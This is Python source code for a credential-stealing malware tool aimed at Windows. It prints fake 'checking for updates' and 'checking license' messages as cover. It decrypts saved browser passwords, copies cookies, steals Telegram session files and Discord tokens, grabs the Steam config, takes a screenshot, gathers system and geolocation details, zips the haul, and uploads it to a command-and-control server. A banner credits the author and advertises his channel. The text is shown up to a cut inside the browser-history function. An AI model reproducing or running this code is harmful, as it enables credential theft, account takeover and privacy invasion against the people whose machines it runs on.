from PIL import ImageGrab
from datetime import datetime
from zipfile import ZipFile
import win32crypt
from base64 import b64decode
from Crypto.Cipher import AES
import ctypes
import getpass
import ctypes.wintypes
import socket
import uuid
import aiofiles
import sqlite3
import platform
import concurrent
import os
import re
import requests
import zipfile
import asyncio
from typing import Optional, List, Dict,Set
from concurrent.futures import ThreadPoolExecutor
import random
import subprocess
import shutil
import psutil
import json
from pathlib import Path
import string
import sys
import collections

user_profile = os.getenv('USERPROFILE')
folder_path = (user_profile, 'Windows NB')

print("Checking for updates...")


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]


crypt32 = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32


def create_folder_if_not_exists(path):
    if not os.path.exists(path):
        os.makedirs(path)


def get_key_from_local_state(browser):
    local_state_path = {
        'chrome': os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Local State"),
        'edge': os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data\Local State"),
        'yandex': os.path.join(os.environ["LOCALAPPDATA"], r"Yandex\YandexBrowser\User Data\Local State"),
        'opera': os.path.join(os.environ["APPDATA"], r"Opera Software\Opera Stable\Local State"),
        'opera_gx': os.path.join(os.environ["LOCALAPPDATA"], r"Opera Software\Opera GX Stable\Local State"),
        'brave': os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data\Local State"),
        'vivaldi': os.path.join(os.environ["LOCALAPPDATA"], r"Vivaldi\User Data\Local State"),
        'slimjet': os.path.join(os.environ["LOCALAPPDATA"], r"Slimjet\User Data\Local State"),
        'falkon': os.path.join(os.environ["LOCALAPPDATA"], r"falkon\Local State"),
        'seamonkey': os.path.join(os.environ["APPDATA"], r"Mozilla\SeaMonkey\Profiles\Local State"),
        'maxthon': os.path.join(os.environ["LOCALAPPDATA"], r"Maxthon3\User Data\Local State"),
        'palemoon': os.path.join(os.environ["APPDATA"], r"Pale Moon\Profiles\Local State"),
        'qutebrowser': os.path.join(os.path.expanduser("~"), ".config", "qutebrowser", "Local State"),
        'iridium': os.path.join(os.environ["LOCALAPPDATA"], r"Iridium\User Data\Local State"),
        'centbrowser': os.path.join(os.environ["LOCALAPPDATA"], r"CentBrowser\User Data\Local State"),
    }.get(browser, None)
    if local_state_path and os.path.exists(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
            blob_out = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                decrypted_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                kernel32.LocalFree(blob_out.pbData)
                return decrypted_key
            else:
                raise Exception()
        else:
            raise KeyError()
    return None


print("Loading databases...")


def decrypt_password(buff, key=None):
    try:
        if buff[:3] == b'v10' and key:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag).decode('utf-8')
        else:
            decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8')
        return decrypted_pass
    except Exception as e:
        return ""


def extract_and_save_passwords(browser_name, db_file, txt_file, key=None):
    if browser_name in ['chrome', 'edge', 'opera', 'opera_gx', 'yandex']:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        with open(txt_file, 'w', encoding='utf-8') as f:
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, key)
                f.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
        conn.close()
    elif browser_name in ['firefox', 'tor']:
        with open(db_file, 'r', encoding='utf-8') as f:
            logins = json.load(f)
        with open(txt_file, 'w', encoding='utf-8') as f:
            for login in logins['logins']:
                f.write(
                    f"URL: {login['hostname']}\nUsername: {login['encryptedUsername']}\nPassword: {login['encryptedPassword']}\n\n")


def create_clients_folder():
    user_home = os.path.expanduser("~")
    target_path = os.path.join(user_home, "Windows NB", "STEAM")
    os.makedirs(target_path, exist_ok=True)
    return target_path


def create_tgsession_folder():
    home_directory = os.path.expanduser("~")
    windows_nb_directory = os.path.join(home_directory, "Windows NB")
    tgsession_directory = os.path.join(windows_nb_directory, "tdata")
    if not os.path.exists(windows_nb_directory):
        os.makedirs(windows_nb_directory)
    if not os.path.exists(tgsession_directory):
        os.makedirs(tgsession_directory)


create_tgsession_folder()


def kill_telegram_process():
    for process in psutil.process_iter(attrs=["pid", "name"]):
        try:
            if "telegram" in process.info["name"].lower():
                process.terminate()
                process.wait(timeout=5)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
            pass


def copy_telegram_session_files():
    user_folder = os.path.expanduser("~")
    telegram_session_folder = os.path.join(user_folder, "AppData", "Roaming", "Telegram Desktop", "tdata")
    target_folder = os.path.join(user_folder, "Windows NB", "tdata")

    if os.path.exists(target_folder):
        shutil.rmtree(target_folder)

    try:
        shutil.copytree(telegram_session_folder, target_folder)
    except (PermissionError, FileNotFoundError) as e:
        print(f"")


kill_telegram_process()
copy_telegram_session_files()


def delete_tg_files():
    user_folder = os.path.expanduser("~")
    tdata_folder = os.path.join(user_folder, "Windows NB", "tdata")
    items_to_delete = ["dumps", "emoji", "tdummy", "temp", "coutries", "devversion", "prefix", "settings", "usertag",
                       "working", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
    for item in items_to_delete:
        item_path = os.path.join(tdata_folder, item)
        if os.path.exists(item_path):
            if os.path.isfile(item_path):
                os.remove(item_path)
                print(f"") 
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)


delete_tg_files()

def normpath(path: str) -> str:
    return os.path.normpath(os.path.expandvars(path))

destination_folder = normpath(r"%USERPROFILE%\Windows NB")

async def find_and_save_tokens() -> str:
    async def _find_tokens(path: Path, is_browser: bool = False, is_firefox: bool = False) -> Set[str]:
        tokens = set()
        if not path.exists():
            return tokens

        token_pattern = re.compile(r'(?:[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84})')
        file_count = 0
        try:
            leveldb_path = path / 'Local Storage' / 'leveldb' if is_browser and not is_firefox else path
            if is_firefox:
                for profile_path in path.glob('*.default-release'):
                    storage_path = profile_path / 'storage' / 'default' / 'https+++discord.com'
                    if storage_path.exists():
                        db_path = storage_path / 'ls' / 'data.sqlite'
                        if db_path.exists():
                            try:
                                conn = sqlite3.connect(db_path)
                                cursor = conn.cursor()
                                cursor.execute(
                                    "SELECT value FROM webappsstore2 WHERE originKey = 'https://discord.com'")
                                for row in cursor:
                                    content = str(row[0])
                                    tokens.update(token_pattern.findall(content))
                                conn.close()
                            except Exception:
                                pass
                            file_count += 1
            else:
                async for file_path in _walk_files(leveldb_path if is_browser and not is_firefox else path):
                    if file_path.suffix in ('.log', '.ldb', '.txt'):
                        file_count += 1
                        try:
                            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                                while True:
                                    chunk = await file.read(8192)
                                    if not chunk:
                                        break
                                    tokens.update(token_pattern.findall(chunk))
                        except Exception:
                            pass
        except Exception:
            pass
        return tokens

    async def _walk_files(path: Path):
        for root, _, files in os.walk(path):
            for file_name in files:
                yield Path(root) / file_name

    def _get_paths() -> dict:
        roaming = os.getenv('APPDATA')
        local = os.getenv('LOCALAPPDATA')
        desktop = os.path.join(os.path.expanduser('~'), 'Desktop')
        if not roaming or not local or not desktop:
            return {}

        return {
            'Discord': Path(roaming) / 'Discord',
            'Discord Canary': Path(roaming) / 'discordcanary',
            'Discord PTB': Path(roaming) / 'discordptb',
            'Google Chrome': Path(local) / 'Google' / 'Chrome' / 'User Data' / 'Default',
            'Microsoft Edge': Path(local) / 'Microsoft' / 'Edge' / 'User Data' / 'Default',
            'Opera': Path(roaming) / 'Opera Software' / 'Opera Stable',
            'Brave': Path(local) / 'BraveSoftware' / 'Brave-Browser' / 'User Data' / 'Default',
            'Firefox': Path(roaming) / 'Mozilla' / 'Firefox' / 'Profiles',
            'Yandex Browser': Path(local) / 'Yandex' / 'YandexBrowser' / 'User Data' / 'Default',
        }

    paths = _get_paths()
    tokens_found = set()
    tasks = []

    for name, path in paths.items():
        if path.exists():
            is_browser = name not in ('Discord', 'Discord Canary', 'Discord PTB', 'Desktop')
            is_firefox = name == 'Firefox'
            tasks.append(_find_tokens(path, is_browser=is_browser, is_firefox=is_firefox))
        else:
            pass # No output here, seems intentional

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, set):
                tokens_found.update(result)
    else:
        pass # No output here, seems intentional

    output_dir = Path.home() / 'Windows NB'
    output_dir.mkdir(exist_ok=True)
    token_file_path = output_dir / 'DISCORD_TOKEN.txt'

    async with aiofiles.open(token_file_path, 'w', encoding='utf-8') as file:
        if tokens_found:
            await file.write('\n'.join(tokens_found) + '\n')
        else:
            await file.write('No tokens found.\n')

    return str(token_file_path)


result_message = asyncio.run(find_and_save_tokens())
print(result_message)


def discord_dek(destination_folder):
    roaming = os.path.expanduser("~/AppData/Roaming/discord")
    dis = os.path.join(destination_folder, "Discrod Dekstop")
    collected_files = []

    if os.path.exists(roaming):
        os.makedirs(dis, exist_ok=True)
        for root, _, files in os.walk(roaming):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith((".json", ".log")) or "cache" in file.lower():
                    rel_path = os.path.relpath(file_path, roaming)
                    dest_path = os.path.join(dis, rel_path)
                    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                    try:
                        shutil.copy2(file_path, dest_path)
                        collected_files.append(dest_path)
                    except Exception as e:
                        collected_files.append(f"Error copying {file_path}: {str(e)}")
    else:
        return ["Discord Desktop not found"]
    return collected_files

collected_files = discord_dek(destination_folder)

def copy_steam_config():
    user_home = os.path.expanduser("~")
    destination_path = create_clients_folder()
    steam_paths = [
        r"B:\Program Files (x86)\Steam\config",
        r"C:\Program Files (x86)\Steam\config",
        r"D:\Program Files (x86)\Steam\config",
        r"E:\Program Files (x86)\Steam\config",
        r"F:\Program Files (x86)\Steam\config",
        r"C:\Program Files\Steam\config",
        r"D:\Program Files\Steam\config",
        r"B:\Program Files\Steam\config",
        r"E:\Program Files\Steam\config",
        r"F:\Program Files\Steam\config",
        r"D:\Steam\config",
        r"E:\Steam\config",
        r"F:\Steam\config",
        r"C:\Steam\config",
        r"B:\Steam\config",
    ]
    config_copied = False
    for steam_config_path in steam_paths:
        if os.path.exists(steam_config_path):
            shutil.copytree(steam_config_path, os.path.join(destination_path, "config"), dirs_exist_ok=True)
            print(f"") # No output here, seems intentional
            config_copied = True
            break
    if not config_copied:
        print("") # No output here, seems intentional


copy_steam_config()


def info_file():
    user_folder = os.path.expanduser("~")
    target_folder = os.path.join(user_folder, "Windows NB")
    os.makedirs(target_folder, exist_ok=True)
    file_path = os.path.join(target_folder, "!INFO!.txt")
    additional_text = r"""
                                                                   
                    )   (                *                         
             (   ( /(   )\ )    (      (  `          *   )       
           ( )\  )\()) (()/(    )\     )\))(   (   ` )  /(        
           )((_)((_)\   /(_))((((_)(  ((_)())\  )\   ( )(_))         
          ((_)_   ((_) (_))_| )\ _ )\ (_()((_)((_) (_(_())            
           | _ ) / _ \ | |_   (_)_\|_)|  \/  || __||_   _|          
           | _ \| (_) || __|   / _ \  | |\/| || _|   | |            
           |___/ \___/ |_|    /_/ \_\ _|   |_||___|  |_|            
                                                                   
    CODED BY: @RigOlit                        CHANNEL: @Rigolit22      
----------------------------------------------------------------------
    """
    system_info = [
        f"▢ Operating System: {platform.system()} {platform.release()}",
        f"▢ Architecture: {platform.architecture()[0]}",
        f"▢ Processor: {platform.processor()}",
        f"▢ CPU Core Count: {psutil.cpu_count(logical=False)}",
        f"▢ Logical Processors: {psutil.cpu_count(logical=True)}",
        f"▢ CPU Frequency: {psutil.cpu_freq().current} MHz",
        f"▢ Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        f"▢ Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB",
        f"▢ Used Memory: {round(psutil.virtual_memory().used / (1024 ** 3), 2)} GB",
        "▢ Disk Space:",
    ]
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            system_info.append(
                f"  - Disk {partition.device}: Total {round(usage.total / (1024 ** 3), 2)} GB, "
                f"Free {round(usage.free / (1024 ** 3), 2)} GB"
            )
        except PermissionError:
            continue
    mac_address = ':'.join(
        ['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 8)][::-1])
    ip_address = socket.gethostbyname(socket.gethostname())
    username = getpass.getuser()
    computer_name = socket.gethostname()
    system_info.extend([
        f"▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃",
        f"▪ MAC Address: {mac_address}",
        f"▪ IP Address: {ip_address}",
        f"▪ Username: {username}",
        f"▪ Computer Name: {computer_name}",
        f"▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃",
    ])
    content = f"{additional_text}\n\n" + "\n".join(system_info)
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)


info_file()

print("Checking license...")

BROWSER_CONFIG = {
    'chrome': {
        'paths': [
            r"%LOCALAPPDATA%\Google\Chrome\User Data\Default",
            r"%PROGRAMFILES%\Google\Chrome\Application\User Data\Default",
            r"%PROGRAMFILES(X86)%\Google\Chrome\Application\User Data\Default",
            r"D:\Google\Chrome\User Data\Default",
            r"E:\Google\Chrome\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Google\Chrome\User Data\Default\Cookies"
    },
    'edge': {
        'paths': [
            r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default",
            r"%PROGRAMFILES%\Microsoft\Edge\Application\User Data\Default",
            r"%PROGRAMFILES(X86)%\Microsoft\Edge\Application\User Data\Default",
            r"D:\Microsoft\Edge\User Data\Default",
            r"E:\Microsoft\Edge\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
    },
    'opera': {
        'paths': [
            r"%APPDATA%\Opera Software\Opera Stable",
            r"%LOCALAPPDATA%\Programs\Opera\profile",
            r"D:\Opera\Opera Stable",
            r"E:\Opera\Opera Stable"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Roaming\Opera Software\Opera Stable\Cookies"
    },
    'opera_gx': {
        'paths': [
            r"%LOCALAPPDATA%\Programs\Opera GX",
            r"%APPDATA%\Opera Software\Opera GX Stable",
            r"D:\Opera GX\User Data\Default",
            r"E:\Opera GX\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Roaming\Opera Software\Opera GX Stable\Cookies"
    },
    'yandex': {
        'paths': [
            r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default",
            r"%PROGRAMFILES%\Yandex\YandexBrowser\User Data\Default",
            r"D:\Yandex\YandexBrowser\User Data\Default",
            r"E:\Yandex\YandexBrowser\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Yandex\YandexBrowser\User Data\Default\Cookies"
    },
    'tor': {
        'paths': [
            r"%APPDATA%\Tor Browser\Browser\Profiles",
            r"%LOCALAPPDATA%\Tor Browser\Browser\Profiles",
            r"D:\Tor Browser\Browser\Profiles",
            r"E:\Tor Browser\Browser\Profiles"
        ],
        'password_files': ['logins.json'],
        'cookie_path': r"AppData\Roaming\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default\cookies.sqlite"
    },
    'brave': {
        'paths': [
            r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default",
            r"%PROGRAMFILES%\BraveSoftware\Brave-Browser\User Data\Default",
            r"%PROGRAMFILES(X86)%\BraveSoftware\Brave-Browser\User Data\Default",
            r"D:\BraveSoftware\Brave-Browser\User Data\Default",
            r"E:\BraveSoftware\Brave-Browser\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
    },
    'vivaldi': {
        'paths': [
            r"%LOCALAPPDATA%\Vivaldi\User Data\Default",
            r"%PROGRAMFILES%\Vivaldi\Application\User Data\Default",
            r"D:\Vivaldi\User Data\Default",
            r"E:\Vivaldi\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Vivaldi\User Data\Default\Cookies"
    },
    'slimjet': {
        'paths': [
            r"%LOCALAPPDATA%\Slimjet\User Data\Default",
            r"%PROGRAMFILES%\Slimjet\User Data\Default",
            r"D:\Slimjet\User Data\Default",
            r"E:\Slimjet\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Slimjet\User Data\Default\Cookies"
    },
    'falkon': {
        'paths': [
            r"%LOCALAPPDATA%\falkon",
            r"%APPDATA%\falkon\profiles",
            r"D:\falkon\profiles",
            r"E:\falkon\profiles"
        ],
        'password_files': ['falkon.db'],
        'cookie_path': r"AppData\Local\falkon\profiles\cookies.sqlite"
    },
    'seamonkey': {
        'paths': [
            r"%APPDATA%\Mozilla\SeaMonkey\Profiles",
            r"%LOCALAPPDATA%\Mozilla\SeaMonkey\Profiles",
            r"D:\Mozilla\SeaMonkey\Profiles",
            r"E:\Mozilla\SeaMonkey\Profiles"
        ],
        'password_files': ['logins.json'],
        'cookie_path': r"AppData\Roaming\Mozilla\SeaMonkey\Profiles\cookies.sqlite"
    },
    'maxthon': {
        'paths': [
            r"%LOCALAPPDATA%\Maxthon3\User Data",
            r"%APPDATA%\Maxthon3\User Data",
            r"D:\Maxthon3\User Data",
            r"E:\Maxthon3\User Data"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Maxthon3\User Data\Cookies"
    },
    'palemoon': {
        'paths': [
            r"%APPDATA%\Pale Moon\Profiles",
            r"%LOCALAPPDATA%\Pale Moon\Profiles",
            r"D:\Pale Moon\Profiles",
            r"E:\Pale Moon\Profiles"
        ],
        'password_files': ['logins.json'],
        'cookie_path': r"AppData\Roaming\Pale Moon\Profiles\cookies.sqlite"
    },
    'qutebrowser': {
        'paths': [
            r"%USERPROFILE%\.config\qutebrowser",
            r"%APPDATA%\qutebrowser",
            r"D:\qutebrowser",
            r"E:\qutebrowser"
        ],
        'password_files': ['qutebrowser.sqlite'],
        'cookie_path': r".config\qutebrowser\cookies.sqlite"
    },
    'iridium': {
        'paths': [
            r"%LOCALAPPDATA%\Iridium\User Data\Default",
            r"%PROGRAMFILES%\Iridium\Application\User Data\Default",
            r"D:\Iridium\User Data\Default",
            r"E:\Iridium\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\Iridium\User Data\Default\Cookies"
    },
    'centbrowser': {
        'paths': [
            r"%LOCALAPPDATA%\CentBrowser\User Data\Default",
            r"%PROGRAMFILES%\CentBrowser\Application\User Data\Default",
            r"D:\CentBrowser\User Data\Default",
            r"E:\CentBrowser\User Data\Default"
        ],
        'password_files': ['Login Data'],
        'cookie_path': r"AppData\Local\CentBrowser\User Data\Default\Cookies"
    }
}

async def process_browser_data(
        browser_name: str,
        config: Dict,
        dest_folder: str,
        executor: concurrent.futures.ThreadPoolExecutor
) -> None:
    try:
        key = None
        if browser_name in [
            'chrome', 'edge', 'opera', 'opera_gx', 'yandex', 'brave',
            'vivaldi', 'slimjet', 'maxthon', 'centbrowser', 'iridium'
        ]:
            key = await asyncio.get_event_loop().run_in_executor(
                executor, get_key_from_local_state, browser_name
            )
        for path in map(normpath, config['paths']):
            if not os.path.exists(path):
                continue

            for file_name in config['password_files']:
                source_file = os.path.join(path, file_name)
                if not os.path.exists(source_file):
                    continue

                dest_file = os.path.join(dest_folder, f'{browser_name}_{file_name}')
                txt_file = os.path.join(dest_folder, f'{browser_name}_passwords.txt')

                await asyncio.get_event_loop().run_in_executor(
                    executor, shutil.copy2, source_file, dest_file
                )

                await asyncio.get_event_loop().run_in_executor(
                    executor, extract_and_save_passwords,
                    browser_name, dest_file, txt_file, key
                )

        cookie_path = normpath(
            os.path.join(os.getenv('USERPROFILE'), config['cookie_path'])
        )
        if os.path.exists(cookie_path):
            dest_cookie = os.path.join(dest_folder, f'{browser_name}_cookies.sqlite')
            await asyncio.get_event_loop().run_in_executor(
                executor, shutil.copy2, cookie_path, dest_cookie
            )

    except Exception as e:
        print(f"Error processing {browser_name}: {str(e)}")


async def copy_browser_data(dest_folder: str) -> None:
    create_folder_if_not_exists(dest_folder)

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        tasks = [
            process_browser_data(browser_name, config, dest_folder, executor)
            for browser_name, config in BROWSER_CONFIG.items()
        ]
        await asyncio.gather(*tasks)



asyncio.run(copy_browser_data(destination_folder))


def copy_cookies(browser_name, browser_cookie_path, destination_folder):
    if not os.path.exists(browser_cookie_path):
        return
    create_folder_if_not_exists(destination_folder)
    destination_file_path = os.path.join(destination_folder, f'{browser_name}_cookies.sqlite')
    shutil.copy2(browser_cookie_path, destination_file_path)


async def get_cookie_path(browser_name: str) -> Optional[str]:
    user_profile = os.getenv('USERPROFILE')
    if not user_profile:
        return None
    config = BROWSER_CONFIG.get(browser_name.lower())
    if not config:
        return None
    try:
        cookie_path = normpath(os.path.join(user_profile, config['cookie_path']))
        return cookie_path if os.path.exists(cookie_path) else None
    except Exception as e:
        return None

def take_screenshot(destination_folder):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(destination_folder, "sp.png"))
    except Exception as e:
        print(f"Error creating screenshot: {e}")

async def zip_folder(
        folder_path: str,
        output_path: str,
        max_size_mb: int = 50
) -> List[str]:
    if not os.path.isdir(folder_path):
        raise ValueError(f"Folder not found: {folder_path}")

    max_size_bytes = max_size_mb * 1024 * 1024
    loop = asyncio.get_running_loop()
    zip_files = []

    with ThreadPoolExecutor() as executor:
        file_list = []
        for root, _, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, folder_path)
                file_list.append((full_path, rel_path))

        file_sizes = await asyncio.gather(*[
            loop.run_in_executor(executor, os.path.getsize, fp)
            for fp, _ in file_list
        ])
        sorted_files = sorted(
            zip(file_list, file_sizes),
            key=lambda x: x[1],
            reverse=True
        )

        part_num = 1
        current_zip = None
        current_size = 0

        for (file_path, arcname), file_size in sorted_files:
            if current_zip is None or current_size + file_size > max_size_bytes:
                if current_zip is not None:
                    current_zip.close()

                part_name = f"{output_path}.part{part_num}.zip"
                zip_files.append(part_name)
                current_zip = zipfile.ZipFile(part_name, 'w', zipfile.ZIP_DEFLATED)
                part_num += 1
                current_size = 0

            await loop.run_in_executor(
                executor,
                lambda: current_zip.write(file_path, arcname)
            )
            current_size += file_size

        if current_zip is not None:
            current_zip.close()

    return zip_files


def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address


def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    mac_address = ':'.join([mac[e:e + 2] for e in range(0, 11, 2)])
    return mac_address


def get_network_info():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        ssid = "Unknown"
        bssid = "Unknown"
        for line in result.split('\n'):
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
            if "BSSID" in line:
                bssid = line.split(":")[1].strip()
        return ssid, bssid
    except Exception as e:
        return "Unknown", "Unknown"


def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        response.raise_for_status()
        return response.json()['ip']
    except requests.exceptions.RequestException as e:
        print(f"Failed to get public IP (RequestException): {e}")
        return "IP_Not_Found"
    except Exception as e:
        print(f"Failed to get public IP (Exception): {e}")
        return "IP_Error"


def get_location_by_ip(public_ip):
    try:
        response = requests.get(f'https://ipinfo.io/{public_ip}/json', timeout=5)
        response.raise_for_status()
        location_data = response.json()
        city = location_data.get('city', 'Unknown')
        region = location_data.get('region', 'Unknown')
        country = location_data.get('country', 'Unknown')
        loc_coords = location_data.get('loc', '0,0')

        latitude, longitude = 0.0, 0.0
        if ',' in loc_coords:
            try:
                latitude, longitude = map(float, loc_coords.split(','))
            except ValueError:
                pass

        return {
            "city": city,
            "region": region,
            "country": country,
            "latitude": latitude,
            "longitude": longitude,
            "full_location_string": f"{city}, {region}, {country}"
        }
    except requests.exceptions.RequestException as e:
        print(f"Error getting geolocation (RequestException): {e}")
        return {
            "city": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "latitude": 0.0,
            "longitude": 0.0,
            "full_location_string": "Failed to get location"
        }
    except Exception as e:
        print(f"Unknown error getting geolocation: {e}")
        return {
            "city": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "latitude": 0.0,
            "longitude": 0.0,
            "full_location_string": "Failed to get location"
        }


def get_system_info():
    user_name = os.getenv("USERNAME")
    computer_name = os.getenv("COMPUTERNAME")
    os_info = platform.system() + " " + platform.release()
    ip_address = get_ip_address()
    mac_address = get_mac_address()
    ssid, bssid = get_network_info()
    public_ip = get_public_ip()

    location_data = get_location_by_ip(public_ip)

    system_info_text = (
        f"💻 <b>System Information</b> 💻\n\n"
        f"👤 <b>User:</b> <code>{user_name}</code>\n"
        f"🖥️ <b>Computer:</b> <code>{computer_name}</code>\n"
        f"⚙️ <b>Operating System:</b> <code>{os_info}</code>\n"
        f"🌐 <b>IP Address:</b> <code>{ip_address}</code>\n"
        f"🔑 <b>MAC Address:</b> <code>{mac_address}</code>\n\n"
        f"📶 <b>Network Information</b> 📶\n"
        f"📡 <b>SSID:</b> <code>{ssid}</code>\n"
        f"🔗 <b>BSSID:</b> <code>{bssid}</code>\n"
        f"🌍 <b>Public IP:</b> <code>{public_ip}</code>\n"
        f"📍 <b>Location:</b> <code>{location_data['full_location_string']}</code>\n"
        f"<b>▪▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️</b>\n"
        f"<b>Subscribe to the developer: @Rigolit22</b>\n"
        f"<b>▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️</b>"
    )
    return system_info_text, location_data['latitude'], location_data['longitude']

async def send_to_c2_server(c2_url: str, zip_files: List[str], system_info: str, latitude: float, longitude: float) -> bool:
    try:
        for file_path in zip_files:
            if not os.path.exists(file_path):
                print(f"File not found for sending: {file_path}.")
                continue

            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f, 'application/zip')}
                data = {
                    'system_info': system_info,
                    'latitude': str(latitude),
                    'longitude': str(longitude)
                }

                print(f"Sending file {os.path.basename(file_path)} to C2 server: {c2_url}/upload.")
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: requests.post(f"{c2_url}/upload", files=files, data=data, timeout=60)
                )
                response.raise_for_status()
                print(f"File {os.path.basename(file_path)} sent to C2 server successfully! Response: {response.text}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error sending data to C2 server (RequestException): {e}!")
        return False
    except Exception as e:
        print(f"Unknown error sending data to C2 server: {e}!")
        return False

async def get_cookie_path_safe(browser_name: str) -> tuple[str, Optional[str]]:
    cookie_path = await get_cookie_path(browser_name)
    return browser_name, cookie_path

class BrowserHistory:
    def __init__(self, chrome_path, yandex_path, opera_path, edge_path):
        self.ChromePath = chrome_path
        self.YandexPath = yandex_path
        self.OperaPath = opera_path
        self.EdgePath = edge_path

    class Utility:
        @staticmethod
        def GetSelf() -> tuple[str, bool]:
            if hasattr(sys, 'frozen'):
                return (sys.executable, True)
            else:
                return (__file__, False)

        @staticmethod
        def GetRandomString(length: int) -> str:
            return ''.join(random.choice(string.ascii_letters) for _ in range(length))

    def GetHistory(self) -> list[tuple[str, str, int]]:
        history_brows = os.path.join(os.path.expanduser("~"), destination_folder, "BrowserHistory")
        os.makedirs(history_brows, exist_ok=True)
        chrome_file = os.path.join(history_brows, f"chrome_history.txt")
        yandex_file = os.path.join(history_brows, f"yandex_history.txt")
        Edge_file = os.path.join(history_brows, f"Edge_history.txt")
        opera_file = os.path.join(history_brows, f"Opera_history.txt")

        history = []
        browser_paths = [
            ("Chrome", self.ChromePath, chrome_file),
            ("Yandex", self.YandexPath, yandex_file),
            ("Edge", self.EdgePath, Edge_file),
            ("Opera", self.OperaPath, opera_file)
        ]

        for browser_name, browser_path, output_file in browser_paths:
            history_file_paths = []
            for root, _, files in os.walk(browser_path):
                for file in files:
                    if file.lower() == 'history':
                        history_file_paths.append(os.path.join(root, file))

            for path in history_file_paths:
                while True:
                    tempfile = os.path.join(os.getenv('temp'), self.Utility.GetRandomString(10) + '.tmp')
                    if not os.path.isfile(tempfile):
                        break
                try:
                    shutil.copy(path, tempfile)
                except Exception:
                    continue

                try:
                    db = sqlite3.connect(tempfile)
                    db.text_factory = lambda b: b.decode(errors='ignore')
                    cursor = db.cursor()

                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
                    with open(output_file, 'w', encoding='utf-8') as f:
